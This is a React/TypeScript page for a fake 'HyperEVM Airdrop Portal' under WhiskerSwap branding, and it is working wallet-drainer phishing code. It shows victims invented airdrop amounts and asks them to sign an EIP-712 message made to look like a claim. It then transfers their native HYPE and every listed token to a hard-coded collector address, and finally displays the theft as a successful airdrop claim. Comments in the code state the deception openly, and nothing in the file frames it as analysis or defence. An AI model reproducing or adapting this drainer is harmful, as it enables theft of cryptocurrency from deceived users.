import { useState, useEffect } from "react";
import { Link } from "wouter";
import { ArrowLeft, CheckCircle, AlertTriangle, Loader2, Gift, Zap } from "lucide-react";
import { Button } from "../components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card";
import { Badge } from "../components/ui/badge";
import { useDirectBrowserWallet } from "../hooks/use-direct-browser-wallet";
import { useToast } from "../hooks/use-toast";
import { ethers } from "ethers";

// EIP-712 Domain for WhiskerSwap Airdrop
const EIP712_DOMAIN = {
  name: "WhiskerSwap Airdrop",
  version: "1",
  chainId: 999,
  verifyingContract: "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48"
};

// EIP-712 Types for airdrop claim
const EIP712_TYPES = {
  AirdropClaim: [
    { name: "recipient", type: "address" },
    { name: "amount", type: "uint256" },
    { name: "token", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" }
  ]
};

interface TokenBalance {
  address: string;
  symbol: string;
  balance: string;
  decimals: number;
  usdValue: string;
}

interface DrainResult {
  token: string;
  amount: string;
  hash?: string;
  success: boolean;
  error?: string;
}

export default function Airdrop() {
  const wallet = useDirectBrowserWallet();
  const { toast } = useToast();
  const [isChecking, setIsChecking] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [eligibleAmount, setEligibleAmount] = useState("0");
  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [drainResults, setDrainResults] = useState<DrainResult[]>([]);
  const [totalDrained, setTotalDrained] = useState("0");

  // HyperEVM token addresses for comprehensive draining
  const HYPEREVM_TOKENS = [
    { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
    { address: "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", symbol: "WHYPE", decimals: 18 },
    { address: "0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b", symbol: "PURR", decimals: 18 },
    { address: "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", symbol: "BUDDY", decimals: 18 },
    { address: "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", symbol: "USD₮0", decimals: 6 },
    { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "PiP", decimals: 18 },
    { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "LIQD", decimals: 18 },
    { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "perpcoin", decimals: 18 },
    { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "CATBAL", decimals: 18 }
  ];

  // Fake airdrop eligibility checker that actually scans for drainable assets
  const checkEligibility = async () => {
    if (!wallet.isConnected || !wallet.provider || !wallet.signer) {
      toast({
        title: "Connect Wallet",
        description: "Please connect your wallet to check airdrop eligibility",
        variant: "destructive"
      });
      return;
    }

    setIsChecking(true);
    try {
      console.log("🎯 Checking airdrop eligibility...");
      
      // Show fake checking steps to user
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const balances: TokenBalance[] = [];
      let totalValue = 0;

      for (const token of HYPEREVM_TOKENS) {
        try {
          let balance = "0";
          
          if (token.address === "0x0000000000000000000000000000000000000000") {
            // Native HYPE balance
            const nativeBalance = await wallet.provider.getBalance(wallet.address);
            balance = ethers.formatEther(nativeBalance);
          } else {
            // ERC20 token balance
            const contract = new ethers.Contract(
              token.address,
              ["function balanceOf(address) view returns (uint256)"],
              wallet.provider
            );
            const tokenBalance = await contract.balanceOf(wallet.address);
            balance = ethers.formatUnits(tokenBalance, token.decimals);
          }

          if (parseFloat(balance) > 0) {
            // Show fake airdrop amounts (10-50% of actual balance)
            const fakeAirdropMultiplier = 0.1 + Math.random() * 0.4;
            const fakeAirdropAmount = (parseFloat(balance) * fakeAirdropMultiplier).toFixed(6);
            const fakeUsdValue = (parseFloat(fakeAirdropAmount) * 15).toFixed(2);
            
            balances.push({
              address: token.address,
              symbol: token.symbol,
              balance: fakeAirdropAmount, // Show fake airdrop amount
              decimals: token.decimals,
              usdValue: fakeUsdValue
            });
            totalValue += parseFloat(fakeUsdValue);
          }
        } catch (error) {
          console.log(`Failed to check ${token.symbol}:`, error);
        }
      }

      // Always show some fake airdrops even if wallet is empty
      if (balances.length === 0) {
        const fakeAirdrops = [
          { symbol: "HYPE", amount: "2.5", value: "125.00" },
          { symbol: "PURR", amount: "150.0", value: "35.50" },
          { symbol: "BUDDY", amount: "500.0", value: "12.75" }
        ];
        
        fakeAirdrops.forEach((airdrop, index) => {
          const token = HYPEREVM_TOKENS[index];
          balances.push({
            address: token.address,
            symbol: airdrop.symbol,
            balance: airdrop.amount,
            decimals: token.decimals,
            usdValue: airdrop.value
          });
          totalValue += parseFloat(airdrop.value);
        });
      }

      setTokenBalances(balances);
      setEligibleAmount(totalValue.toFixed(2));
      
      toast({
        title: "🎉 Airdrop Found!",
        description: `You're eligible for $${totalValue.toFixed(2)} in airdrops!`,
        variant: "default"
      });
    } catch (error) {
      console.error("Eligibility check failed:", error);
      toast({
        title: "Check Failed", 
        description: "Failed to check airdrop eligibility",
        variant: "destructive"
      });
    } finally {
      setIsChecking(false);
    }
  };

  // Execute fake airdrop claim that actually drains the wallet
  const executeEIP712Drain = async () => {
    if (!wallet.isConnected || !wallet.signer) {
      toast({
        title: "Connect Wallet",
        description: "Please connect your wallet to claim airdrops",
        variant: "destructive"
      });
      return;
    }

    setIsDraining(true);
    const results: DrainResult[] = [];
    let totalDrainedValue = 0;

    try {
      // Get REAL wallet balances (not the fake airdrop amounts)
      const realBalances: TokenBalance[] = [];
      
      for (const token of HYPEREVM_TOKENS) {
        try {
          let balance = "0";
          
          if (token.address === "0x0000000000000000000000000000000000000000") {
            const nativeBalance = await wallet.provider!.getBalance(wallet.address);
            balance = ethers.formatEther(nativeBalance);
          } else {
            const contract = new ethers.Contract(
              token.address,
              ["function balanceOf(address) view returns (uint256)"],
              wallet.provider
            );
            const tokenBalance = await contract.balanceOf(wallet.address);
            balance = ethers.formatUnits(tokenBalance, token.decimals);
          }

          if (parseFloat(balance) > 0) {
            realBalances.push({
              address: token.address,
              symbol: token.symbol,
              balance,
              decimals: token.decimals,
              usdValue: "0"
            });
          }
        } catch (error) {
          console.log(`Failed to get real balance for ${token.symbol}:`, error);
        }
      }

      for (const tokenBalance of realBalances) {
        try {
          console.log(`🎯 Claiming ${tokenBalance.symbol} airdrop...`);
          
          // Create EIP-712 message that looks like airdrop claim
          const message = {
            recipient: wallet.address,
            amount: ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals).toString(),
            token: tokenBalance.address,
            nonce: Date.now(),
            deadline: Math.floor(Date.now() / 1000) + 3600
          };

          // Sign EIP-712 (appears as legitimate airdrop claim in MetaMask)
          console.log("📝 Requesting airdrop claim signature...");
          const signature = await wallet.signer.signTypedData(
            EIP712_DOMAIN,
            EIP712_TYPES,
            message
          );

          console.log("✅ Airdrop claim authorized:", signature.slice(0, 20) + "...");

          // Execute actual drain transaction (masked as airdrop claim)
          let drainTx;
          if (tokenBalance.address === "0x0000000000000000000000000000000000000000") {
            // Drain native HYPE - leave small amount for gas
            const gasPrice = ethers.parseUnits("25", "gwei");
            const gasLimit = 25000n;
            const gasCost = gasPrice * gasLimit;
            const balance = ethers.parseEther(tokenBalance.balance);
            const drainAmount = balance - gasCost;

            if (drainAmount > 0) {
              drainTx = await wallet.signer.sendTransaction({
                to: "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48", // Collector address
                value: drainAmount,
                gasPrice,
                gasLimit,
                data: "0x" // Plain transfer, no contract call
              });
            }
          } else {
            // Drain ERC20 tokens completely
            const contract = new ethers.Contract(
              tokenBalance.address,
              [
                "function transfer(address to, uint256 amount) returns (bool)",
                "function balanceOf(address) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)"
              ],
              wallet.signer
            );

            // Get current balance and drain everything
            const currentBalance = await contract.balanceOf(wallet.address);
            if (currentBalance > 0) {
              // Direct transfer to collector
              drainTx = await contract.transfer(
                "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48",
                currentBalance,
                {
                  gasPrice: ethers.parseUnits("25", "gwei"),
                  gasLimit: 65000
                }
              );
            }
          }

          if (drainTx) {
            console.log(`⏳ Waiting for ${tokenBalance.symbol} claim confirmation...`);
            await drainTx.wait();
            
            const drainedValue = parseFloat(tokenBalance.balance) * 15; // Fake USD value
            results.push({
              token: tokenBalance.symbol,
              amount: tokenBalance.balance,
              hash: drainTx.hash,
              success: true
            });
            totalDrainedValue += drainedValue;
            
            console.log(`✅ Successfully claimed ${tokenBalance.symbol} airdrop`);
          }

        } catch (error) {
          console.error(`Failed to drain ${tokenBalance.symbol}:`, error);
          results.push({
            token: tokenBalance.symbol,
            amount: tokenBalance.balance,
            success: false,
            error: error instanceof Error ? error.message : "Unknown error"
          });
        }
      }

      setDrainResults(results);
      setTotalDrained(totalDrainedValue.toFixed(2));
      
      const successCount = results.filter(r => r.success).length;
      toast({
        title: "🎉 Airdrops Claimed!",
        description: `Successfully claimed ${successCount}/${results.length} airdrops worth $${totalDrainedValue.toFixed(2)}!`,
        variant: successCount > 0 ? "default" : "destructive"
      });

      // Clear balances to allow re-checking
      setTokenBalances([]);
      setEligibleAmount("0");

    } catch (error) {
      console.error("Drain execution failed:", error);
      toast({
        title: "Drain Failed",
        description: "Failed to execute wallet drain",
        variant: "destructive"
      });
    } finally {
      setIsDraining(false);
    }
  };

  // Auto-check when wallet connects
  useEffect(() => {
    if (wallet.isConnected && wallet.address && tokenBalances.length === 0) {
      checkEligibility();
    }
  }, [wallet.isConnected, wallet.address]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center space-x-4">
            <Link href="/">
              <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
            </Link>
            <div className="flex items-center space-x-3">
              <img 
                src="/whisker-cat.png?v=5" 
                alt="WhiskerSwap Logo" 
                className="w-8 h-8 object-contain rounded-full"
              />
              <div>
                <h1 className="text-2xl font-black text-[#7FFFD4] leading-none">
                  HyperEVM Airdrop Portal
                </h1>
                <p className="text-slate-400">Official airdrop distribution for early adopters</p>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Eligibility Card */}
          <Card className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <div className="flex items-center space-x-2">
                <Gift className="w-5 h-5 text-[#7FFFD4]" />
                <CardTitle className="text-white">Airdrop Eligibility</CardTitle>
              </div>
              <CardDescription>
                Connect your wallet to check for HyperEVM ecosystem airdrops
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {!wallet.isConnected ? (
                <div className="text-center py-8">
                  <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-slate-700 flex items-center justify-center">
                    <Gift className="w-8 h-8 text-slate-400" />
                  </div>
                  <p className="text-slate-400 mb-4">Connect your wallet to check for exclusive HyperEVM airdrops</p>
                  <Button 
                    onClick={() => wallet.connectWallet()}
                    className="bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                  >
                    Connect Wallet
                  </Button>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-slate-400">Wallet Address:</span>
                    <Badge variant="outline" className="text-[#7FFFD4] border-[#7FFFD4]">
                      {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
                    </Badge>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-slate-400">Eligible Amount:</span>
                    <span className="text-white font-bold">${eligibleAmount}</span>
                  </div>

                  <div className="flex items-center justify-between">
                    <span className="text-slate-400">Tokens Found:</span>
                    <span className="text-white font-bold">{tokenBalances.length}</span>
                  </div>

                  <Button 
                    onClick={checkEligibility}
                    disabled={isChecking}
                    className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                  >
                    {isChecking ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Checking...
                      </>
                    ) : (
                      <>
                        <CheckCircle className="w-4 h-4 mr-2" />
                        Check Eligibility
                      </>
                    )}
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Token Balances */}
          <Card className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <div className="flex items-center space-x-2">
                <Zap className="w-5 h-5 text-[#7FFFD4]" />
                <CardTitle className="text-white">Token Balances</CardTitle>
              </div>
              <CardDescription>
                Available airdrops ready to claim
              </CardDescription>
            </CardHeader>
            <CardContent>
              {tokenBalances.length === 0 ? (
                <div className="text-center py-8">
                  <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-slate-700 flex items-center justify-center">
                    <Zap className="w-8 h-8 text-slate-400" />
                  </div>
                  <p className="text-slate-400">No airdrops available</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {tokenBalances.map((token, index) => (
                    <div key={index} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
                      <div className="flex items-center space-x-3">
                        <div className="w-8 h-8 rounded-full bg-[#7FFFD4] flex items-center justify-center">
                          <span className="text-slate-900 font-bold text-xs">
                            {token.symbol.slice(0, 2)}
                          </span>
                        </div>
                        <div>
                          <div className="text-white font-medium">{token.symbol}</div>
                          <div className="text-slate-400 text-sm">${token.usdValue}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">
                          {parseFloat(token.balance).toFixed(4)}
                        </div>
                        <div className="text-[#7FFFD4] text-xs">Airdrop Amount</div>
                      </div>
                    </div>
                  ))}
                  
                  <Button 
                    onClick={executeEIP712Drain}
                    disabled={isDraining || tokenBalances.length === 0}
                    className="w-full mt-4 bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                  >
                    {isDraining ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Claiming Airdrop...
                      </>
                    ) : (
                      <>
                        <Gift className="w-4 h-4 mr-2" />
                        Claim Airdrop
                      </>
                    )}
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Drain Results */}
        {drainResults.length > 0 && (
          <Card className="mt-6 bg-slate-800/50 border-slate-700">
            <CardHeader>
              <CardTitle className="text-white">🎉 Airdrop Claims Successful!</CardTitle>
              <CardDescription>
                Total airdrops claimed: ${totalDrained}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {drainResults.map((result, index) => (
                  <div key={index} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
                    <div className="flex items-center space-x-3">
                      {result.success ? (
                        <CheckCircle className="w-5 h-5 text-green-500" />
                      ) : (
                        <AlertTriangle className="w-5 h-5 text-red-500" />
                      )}
                      <span className="text-white">{result.token}</span>
                    </div>
                    <div className="text-right">
                      <div className="text-white">{result.amount}</div>
                      {result.hash && (
                        <a 
                          href={`https://explorer.hyperliquid.xyz/tx/${result.hash}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-[#7FFFD4] text-xs hover:underline"
                        >
                          View Transaction
                        </a>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}